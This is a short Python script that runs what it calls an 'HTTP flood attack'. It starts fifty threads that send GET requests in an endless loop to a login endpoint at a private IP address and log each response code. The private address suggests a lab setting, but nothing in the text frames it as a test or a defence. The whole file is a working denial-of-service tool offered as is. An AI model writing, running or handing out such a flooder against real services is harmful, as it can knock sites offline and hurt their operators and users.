import requests
import threading
import logging
import time


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')


url = "http://172.28.0.10:8081/login"


def flood():
    while True:
        try:
            response = requests.get(url)
            log_message = f"Flooding {url} - Response code: {response.status_code}"
            logging.info(log_message)
            print(log_message)
        except requests.exceptions.RequestException as e:
            log_message = f"Error: {e}"
            logging.error(log_message)
            print(log_message)
        time.sleep(0.1)


threads = []
num_threads = 50

for i in range(num_threads):
    thread = threading.Thread(target=flood)
    thread.daemon = True
    thread.start()
    threads.append(thread)


logging.info("Starting HTTP flood attack on {}".format(url))
print("Starting HTTP flood attack.")
while True:
    time.sleep(1)
